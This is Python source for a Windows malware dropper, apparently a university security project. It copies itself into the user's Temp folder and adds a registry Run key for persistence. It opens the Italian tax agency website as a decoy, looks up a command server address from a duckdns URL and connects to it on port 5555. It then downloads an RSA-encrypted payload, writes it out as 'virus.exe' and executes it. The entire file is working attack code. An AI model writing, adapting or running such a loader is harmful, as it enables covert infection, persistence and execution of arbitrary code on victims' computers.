import socket
import os
from os import listdir
from os.path import isfile, join
import subprocess
import time
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import shutil
import sys
import winreg as wrg
import requests
import webbrowser

CYPHERTEXT_LENGTH = 256

CCPORT = 5555
DOWLOADED_FILE_NAME = "virus"

class Cryptography:

    def __init__(self):
        self.keyPair = RSA.generate(2048)
        self.publicKeyPEM = self.keyPair.publickey().exportKey()
        self.manager = PKCS1_OAEP.new(self.keyPair)

    def decrypt(self,cyphertext):
        return self.manager.decrypt(cyphertext)

    def getPublicKey(self):
        return self.publicKeyPEM


class Communication:

    def __init__(self):
        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    def conn(self, CCIP, CCPORT):
        try:
            self.client.connect((CCIP, CCPORT))
        
        except Exception as e:
            pass

    def send(self, message):
        try:
            self.client.send(message)

        except Exception as e:
            pass


    def receive(self, msgSize):
        try:
                while True:
                    data = self.client.recv(msgSize)
                    return data
        except Exception as e:
            pass

def getIp(url):

    headers = {
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux X86_64; rv:109.0) Gecko/20100101 Firefox/117.0',
    'Accept': '*/*',
    'Accept-Language': 'it,en-US;q=0.7,en;q=0.3',
    # 'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://docs.python-requests.org/en/latest/user/quickstart/',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Sec-Fetch-Dest': 'script',
    'Sec-Fetch-Mode': 'no-cors',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-GPC': '1',
}

    r = requests.get(url, headers=headers)
    return r.text
    

def copyFile():
    
    filename = "demoScript.exe"

    path = join(os.getenv('LOCALAPPDATA'),"Temp")
    
    if (not isfile(join(path, filename))):
        try:
            shutil.copyfile(sys.argv[0], join(path, filename))
        except Exception as e:
            pass

def AddToRegistry():
    filename = "demoScript.exe"

    path = join(os.getenv('LOCALAPPDATA'),"Temp")
    address= join(path, filename)

    key = wrg.HKEY_CURRENT_USER
    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"

    try:
        open = wrg.OpenKey(key,key_value,0,wrg.KEY_ALL_ACCESS)

        wrg.SetValueEx(open,"any_name",0,wrg.REG_SZ,address)

        wrg.CloseKey(open)
    except Exception as e:
        pass

    
def saveToFile(data):

    savePath = join(os.getenv('LOCALAPPDATA'),"Temp")
    try: 
        with open(os.path.join(savePath, DOWLOADED_FILE_NAME+".exe"), "wb") as file1:
            file1.write(data)
    except Exception as e:
        pass
    return savePath


def executePayload(savePath):
    subprocess.call([join(savePath, DOWLOADED_FILE_NAME+".exe")])

def openWebBrowser(url):
    try:
        webbrowser.register('edge', None, webbrowser.BackgroundBrowser("C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"))
        webbrowser.get('edge').open(url)  
    except Exception as e:
        pass


def main():

    CCIP = getIp("http://progettosicurezzaeprivacy.duckdns.org:55551/")

    copyFile()
    
    AddToRegistry()

    openWebBrowser('https://www.agenziaentrate.gov.it/portale/')  

    communication = Communication()
    crypto = Cryptography()
    
    

    communication.conn(CCIP, CCPORT)

    # SEND MALWARE'S PK
    communication.send(crypto.getPublicKey())
    
    # RECEIVE ENCRYPTED MESSAGE
    chunks = bytearray()
    
    while True:
        encryptedChunk = communication.receive(CYPHERTEXT_LENGTH)
        chunks.extend(encryptedChunk)
        if not encryptedChunk:
            break 

    # DECRYPTING ENCRYPTED MESSAGE 
    PAYLOAD = bytearray()  
    begin = 0
    end = CYPHERTEXT_LENGTH
    lenght = len(chunks)//CYPHERTEXT_LENGTH
    for i in range(lenght):     
        PAYLOAD.extend(crypto.decrypt(chunks[begin:end]))
        begin = end
        end = begin + CYPHERTEXT_LENGTH

    savePath = saveToFile(PAYLOAD)

    executePayload(savePath)    

    

if __name__ == "__main__":
    main()